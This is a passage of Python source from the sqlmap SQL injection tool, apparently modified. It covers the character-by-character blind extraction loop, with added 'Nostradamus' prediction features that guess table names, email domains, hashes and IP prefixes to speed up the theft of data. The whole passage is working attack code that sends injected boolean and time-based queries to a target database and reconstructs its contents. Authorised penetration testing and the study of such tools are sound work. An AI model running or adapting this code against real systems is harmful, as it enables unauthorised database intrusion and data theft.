                                query = agent.suffixQuery(query)

                                result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                                incrementCounter(getTechnique())

                                # Capture real query duration for accurate stats
                                queryDuration = threadData.lastQueryDuration if hasattr(threadData, 'lastQueryDuration') else None

                                if result:
                                    if showEta:
                                        progress.progress(len(bestCandidate))
                                    elif conf.verbose in (1, 2) or conf.api:
                                        # Show the full predicted value on a clean line
                                        dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), filterControlChars(bestCandidate)))
                                        dataToStdout("\n")

                                    # Use candidate value but preserve the case from extracted chars
                                    # e.g., if partialValue="user" and candidate="USERS",
                                    # finalValue should match what the DB actually returns
                                    if partialValue.islower() and bestCandidate != bestCandidate.lower():
                                        finalValue = bestCandidate.lower()
                                    elif partialValue.isupper() and bestCandidate != bestCandidate.upper():
                                        finalValue = bestCandidate.upper()
                                    else:
                                        finalValue = bestCandidate

                                    predictorHandled = True

                                    predictor.record_hit(bestCandidate, len(partialValue), queryDuration)

                                    debugMsg = "predictor matched value: '%s' (weight: %d)" % (bestCandidate, bestWeight)
                                    logger.debug(debugMsg)

                                    infoMsg = "schema predictor hit: skipped %d characters" % (len(bestCandidate) - len(partialValue))
                                    logger.info(infoMsg)
                                else:
                                    predictor.record_miss(queryDuration)

                                    debugMsg = "predictor miss: tried '%s' for prefix '%s'" % (bestCandidate, partialValue)
                                    logger.debug(debugMsg)

                    if predictorHandled:
                        break

                    # Charset hints - FREE optimization (no extra queries)
                    # Only apply for boolean-based blind; time-based blind has a sensitive
                    # statistical model that breaks when the charset order changes
                    if not val and len(partialValue) >= 2 and not timeBasedCompare:
                        charsetHint = predictor.get_charset_hint(partialValue)
                        if charsetHint and len(charsetHint) >= 3:
                            hintSet = set(charsetHint)
                            prioritizedCharset = charsetHint + [c for c in asciiTbl if c not in hintSet]
                            val = getChar(index, prioritizedCharset, True)

                    if val:
                        predictorHandled = True

                # Common prediction feature (a.k.a. "good samaritan")
                # NOTE: to be used only when multi-threading is not set for
                # the moment
                if not predictorHandled and conf.predictOutput and len(partialValue) > 0 and kb.partRun is not None:
                    val = None
                    commonValue, commonPattern, commonCharset, otherCharset = goGoodSamaritan(partialValue, asciiTbl)

                    # If there is one single output in common-outputs, check
                    # it via equal against the query output
                    if commonValue is not None:
                        # One-shot query containing equals commonValue
                        testValue = unescaper.escape("'%s'" % commonValue) if "'" not in commonValue else unescaper.escape("%s" % commonValue, quote=False)

                        query = getTechniqueData().vector
                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)%s%s" % (expressionUnescaped, INFERENCE_EQUALS_CHAR, testValue)))
                        query = agent.suffixQuery(query)

                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(getTechnique())

                        # Did we have luck?
                        if result:
                            if showEta:
                                progress.progress(len(commonValue))
                            elif conf.verbose in (1, 2) or conf.api:
                                dataToStdout(filterControlChars(commonValue[index - 1:]))

                            finalValue = commonValue
                            break

                    # If there is a common pattern starting with partialValue,
                    # check it via equal against the substring-query output
                    if commonPattern is not None:
                        # Substring-query containing equals commonPattern
                        subquery = queries[Backend.getIdentifiedDbms()].substring.query % (expressionUnescaped, 1, len(commonPattern))
                        testValue = unescaper.escape("'%s'" % commonPattern) if "'" not in commonPattern else unescaper.escape("%s" % commonPattern, quote=False)

                        query = getTechniqueData().vector
                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)=%s" % (subquery, testValue)))
                        query = agent.suffixQuery(query)

                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(getTechnique())

                        # Did we have luck?
                        if result:
                            val = commonPattern[index - 1:]
                            index += len(val) - 1

                    # Otherwise if there is no commonValue (single match from
                    # txt/common-outputs.txt) and no commonPattern
                    # (common pattern) use the returned common charset only
                    # to retrieve the query output
                    if not val and commonCharset:
                        val = getChar(index, commonCharset, False)

                    # If we had no luck with commonValue and common charset,
                    # use the returned other charset
                    if not val:
                        val = getChar(index, otherCharset, otherCharset == asciiTbl)
                elif not predictorHandled:
                    # ─── Nostradamus: Ordered extraction min-char optimization ───
                    # If extracting ordered values (e.g., table names from information_schema),
                    # trim characters below the minimum possible based on the previous value.
                    effectiveCharset = asciiTbl
                    if (kb.get("predictor") and not conf.get("noPredict")
                            and kb.predictor._initialized
                            and kb.predictor._previous_extracted_value):
                        minChar = kb.predictor.get_min_char_for_position(partialValue, index)
                        if minChar is not None:
                            trimmed = [c for c in asciiTbl if c >= minChar]
                            if trimmed and len(trimmed) < len(asciiTbl):
                                originalSize = len(asciiTbl)
                                effectiveCharset = trimmed

                                # Track stats
                                kb.predictor.stats_ordered_trims += 1
                                kb.predictor.stats_ordered_chars_removed += (originalSize - len(trimmed))
                                kb.predictor.stats_ordered_original_total += originalSize

                                # Show charset trim info
                                # Only hide for positions within a prefix that was ALREADY SKIPPED
                                # (partialValue set by prefix skip means those chars are known)
                                showLog = True
                                if partialValue and firstChar > 0 and index <= firstChar:
                                    showLog = False  # prefix was skipped, these positions are known

                                if showLog:
                                    infoMsg = "charset[%d]: '%s'...'%s' (%d/%d chars)" % (
                                        index, chr(trimmed[0]), chr(trimmed[-1]),
                                        len(trimmed), originalSize)
                                    logger.info(infoMsg)

                    # Use continuousOrder=False when charset is restricted (has gaps)
                    useContinuous = not (charsetType is None and conf.charset)
                    if _nostradamusRestrictedCharset:
                        useContinuous = False

                    val = getChar(index, effectiveCharset, useContinuous)

                if val is None:
                    finalValue = partialValue
                    break

                if kb.data.processChar:
                    val = kb.data.processChar(val)

                threadData.shared.value = partialValue = partialValue + val

                if showEta:
                    progress.progress(index)
                elif (conf.verbose in (1, 2) and not kb.bruteMode) or conf.api:
                    dataToStdout(filterControlChars(val))

                # ─── Nostradamus: Email domain auto-complete ───
                # After extracting @X or @XY, try to verify the full domain with MID()
                if (kb.get("predictor") and not conf.get("noPredict")
                        and kb.predictor._initialized
                        and '@' in partialValue and not kb.fileReadMode):
                    atPos = partialValue.rfind('@')
                    afterAt = partialValue[atPos + 1:]
                    # Try when we have 1-2 chars after @
                    if 1 <= len(afterAt) <= 2:
                        candidates = []
                        # Priority 1: learned domain from previous emails
                        if hasattr(kb.predictor, '_learned_email_domain') and kb.predictor._learned_email_domain:
                            if kb.predictor._learned_email_domain.startswith(afterAt):
                                candidates.append(kb.predictor._learned_email_domain)
                        # Priority 2: target domain from URL
                        if kb.predictor._target_domain and kb.predictor._target_domain.startswith(afterAt):
                            if kb.predictor._target_domain not in candidates:
                                candidates.append(kb.predictor._target_domain)
                        # Priority 3: common domains
                        for domain in kb.predictor.EMAIL_DOMAINS:
                            if domain.startswith(afterAt) and domain not in candidates:
                                candidates.append(domain)

                        for domain in candidates[:3]:
                            fullDomain = domain
                            domainStartPos = atPos + 2  # 1-indexed position after @
                            testValue = unescaper.escape("'%s'" % fullDomain)

                            query = getTechniqueData().vector
                            query = agent.prefixQuery(query.replace(INFERENCE_MARKER,
                                "MID((%s),%d,%d)%s%s" % (expressionUnescaped, domainStartPos, len(fullDomain), INFERENCE_EQUALS_CHAR, testValue)))
                            query = agent.suffixQuery(query)

                            result = Request.queryPage(agent.payload(newValue=query),
                                                       timeBasedCompare=timeBasedCompare, raise404=False)
                            incrementCounter(getTechnique())

                            if result:
                                remaining = fullDomain[len(afterAt):]
                                partialValue = partialValue + remaining
                                index += len(remaining)
                                threadData.shared.value = partialValue

                                kb.predictor._learned_email_domain = fullDomain

                                infoMsg = "email domain: verified '@%s' (%d chars skipped)" % (
                                    fullDomain, len(remaining))
                                logger.info(infoMsg)

                                if conf.verbose in (1, 2) and not kb.bruteMode:
                                    dataToStdout(filterControlChars(remaining))
                                break

                # Note: some DBMSes (e.g. Firebird, DB2, etc.) have issues with trailing spaces
                if Backend.getIdentifiedDbms() in (DBMS.FIREBIRD, DBMS.DB2, DBMS.MAXDB, DBMS.DERBY, DBMS.FRONTBASE) and len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace():
                    finalValue = partialValue[:-INFERENCE_BLANK_BREAK]
                    break
                elif charsetType and partialValue[-1:].isspace():
                    finalValue = partialValue[:-1]
                    break

                if (lastChar > 0 and index >= lastChar):
                    finalValue = "" if length == 0 else partialValue
                    finalValue = finalValue.rstrip() if len(finalValue) > 1 else finalValue
                    partialValue = None
                    break

    except KeyboardInterrupt:
        abortedFlag = True
    finally:
        kb.prependFlag = False
        retrievedLength = len(finalValue or "")

        if finalValue is not None:
            finalValue = decodeDbmsHexValue(finalValue) if conf.hexConvert else finalValue
            hashDBWrite(expression, finalValue)

            # Feed discovered value to the schema predictor for future predictions
            if kb.get("predictor") and finalValue and not re.search(r"(?i)(\b|CHAR_)(LENGTH|LEN|COUNT)\(", expression):
                kb.predictor.learn(finalValue)

                # Track for ordered extraction min-char optimization
                # ONLY when extracting from information_schema or SHOW queries
                # (data dumps are NOT alphabetically ordered)
                if re.search(r"(?i)(information_schema|SHOW\s+)", expression):
                    kb.predictor.set_previous_value(finalValue)

                # Auto-detect hash pattern from extracted value
                # If first value looks like a hash, restrict charset for all subsequent rows
                if not kb.predictor._auto_detected_hash_type:
                    kb.predictor.detect_hash_from_value(finalValue)

                # Learn IP prefix for cross-row prediction
                if kb.predictor._current_column_context:
                    col_lower = kb.predictor._current_column_context.lower()
                    is_ip = any(ip.lower() in col_lower or col_lower in ip.lower() for ip in kb.predictor.IP_COLUMN_NAMES)
                    if is_ip:
                        kb.predictor.learn_ip_prefix(finalValue)

                # Persist learned values to session hashDB for cross-run learning
                try:
                    from lib.core.enums import HASHDB_KEYS
                    hashDBWrite(HASHDB_KEYS.KB_PREDICTOR_LEARNED, kb.predictor.serialize_learned())
                except Exception:
                    pass
        elif partialValue:
            hashDBWrite(expression, "%s%s" % (PARTIAL_VALUE_MARKER if not conf.hexConvert else PARTIAL_HEX_VALUE_MARKER, partialValue))

    if conf.hexConvert and not any((abortedFlag, conf.api, kb.bruteMode)):
        infoMsg = "\r[%s] [INFO] retrieved: %s  %s\n" % (time.strftime("%X"), filterControlChars(finalValue), " " * retrievedLength)
        dataToStdout(infoMsg)
    else:
        if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
            dataToStdout("\n")

        if (conf.verbose in (1, 2) and showEta) or conf.verbose >= 3:
            infoMsg = "retrieved: %s" % filterControlChars(finalValue)
            logger.info(infoMsg)

    if kb.threadException:
        raise SqlmapThreadException("something unexpected happened inside the threads")

    if abortedFlag:
        raise KeyboardInterrupt

    _ = finalValue or partialValue

    return getCounter(getTechnique()), safecharencode(_) if kb.safeCharEncode else _

def queryOutputLength(expression, payload):
    """
    Returns the query output length.
    """

    infoMsg = "retrieving the length of query output"
    logger.info(infoMsg)

    start = time.time()

    lengthExprUnescaped = agent.forgeQueryOutputLength(expression)
    count, length = bisection(payload, lengthExprUnescaped, charsetType=CHARSET_TYPE.DIGITS)

    debugMsg = "performed %d quer%s in %.2f seconds" % (count, 'y' if count == 1 else "ies", calculateDeltaSeconds(start))
    logger.debug(debugMsg)

    if isinstance(length, six.string_types) and length.isspace():
        length = 0

    return length
